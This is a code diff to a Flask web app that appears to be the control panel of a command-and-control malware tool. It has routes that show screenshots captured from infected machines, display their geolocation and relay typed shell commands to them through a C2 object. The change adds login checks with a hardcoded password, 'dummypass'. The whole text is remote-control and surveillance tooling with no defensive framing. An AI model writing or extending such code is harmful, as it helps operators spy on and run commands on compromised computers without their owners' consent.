@@ -15,6 +15,7 @@ app.debug = False
 app_instance = app.create_app()
 c2 = CommandAndControl()
 helper = Misc()
+app_auth = Auth('dummypass')
 
 @app_instance.route('/', methods=['GET'])
 def index():
@@ -95,6 +96,8 @@ def logout():
 
 @app_instance.route('/showss', methods=['GET'])
 def showss():
+    if not app_auth.isAuthenticated:
+        return redirect(url_for('index'))
     ss = []
     for file in glob.glob(f"{tempfile.gettempdir()}\\*.png"):
         if os.path.basename(file).startswith('pyc2ss'):
@@ -105,13 +108,17 @@ def showss():
 
 
 @app_instance.route('/geo', methods=['GET', 'POST'])
-def geo():   
+def geo():
+    if not app_auth.isAuthenticated:
+        return redirect(url_for('index'))   
     geo = c2.get_geo_suff()
     return render_template('geostuff.html', geo=geo)
 
 
 @app_instance.route('/shell', methods=['GET', 'POST'])
 def shell():
+    if not app_auth.isAuthenticated:
+        return redirect(url_for('index'))
     if request.method == 'POST':
         cmd = request.form['cmd']
         cmd = c2.shell(cmd)
